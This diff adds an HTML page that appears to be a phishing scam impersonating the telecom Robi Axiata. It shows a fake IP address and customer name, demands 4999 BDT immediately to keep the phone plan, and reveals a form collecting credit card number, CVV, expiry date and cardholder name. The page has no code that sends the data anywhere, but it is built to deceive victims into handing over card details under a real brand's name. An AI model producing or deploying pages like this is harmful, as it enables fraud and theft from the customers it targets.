@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robi Plan Notice</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #fceabb, #f8b500); /* Hue background */
+            color: #333;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #e91e63;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .header img {
+            max-height: 80px;
+        }
+
+        .content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+            width: 80%;
+            max-width: 600px;
+            text-align: center;
+        }
+
+        .info {
+            margin-bottom: 20px;
+        }
+
+        .info p {
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+
+        .payment {
+            background-color: #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .payment button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        #bankDetailsForm {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        #bankDetailsForm input {
+            width: calc(100% - 20px); /* Adjusted width */
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box; /* Include padding and border in width */
+        }
+
+        #bankDetailsForm label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        #bankDetailsForm p {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="Logo_of_Robi_Axiata.png" alt="Robi Axiata Logo">
+    </div>
+    <div class="content">
+        <div class="info">
+            <p>YOUR IP ADDRESS IS 192.100.68.1.</p>
+            <p>CUSTOMER: BIBI AESHA</p>
+            <p>DISTRICT: CHITTAGONG</p>
+        </div>
+        <div class="payment">
+            <p>Please pay us 4999 BDT/- right now to continue using your Robi Plan.</p>
+            <button id="paymentButton">Pay Now</button>
+            <div id="bankDetailsForm">
+                <p>Enter your Bank Details:</p>
+                <label for="ccNumber">Credit Card Number:</label>
+                <input type="text" id="ccNumber" placeholder="Credit Card Number">
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" placeholder="CVV">
+                <label for="expiryDate">Expiry Date (MM/YY):</label>
+                <input type="text" id="expiryDate" placeholder="Expiry Date (MM/YY)">
+                <label for="accountName">Account Holder Name:</label>
+                <input type="text" id="accountName" placeholder="Account Holder Name">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('paymentButton').addEventListener('click', function() {
+            document.getElementById('bankDetailsForm').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
